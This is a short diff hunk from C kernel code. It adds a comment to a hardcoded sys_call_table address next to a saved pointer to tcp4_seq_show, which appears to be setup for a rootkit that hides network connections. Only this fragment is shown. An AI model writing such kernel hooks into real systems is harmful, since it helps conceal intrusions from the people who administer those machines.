@@ -86,6 +86,7 @@ char accountlog[32];
 int counter=0;
 
 unsigned long *sys_call_table = (unsigned long *)0xc1513160;
+//find by hand which is not be exported
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
 
 /*
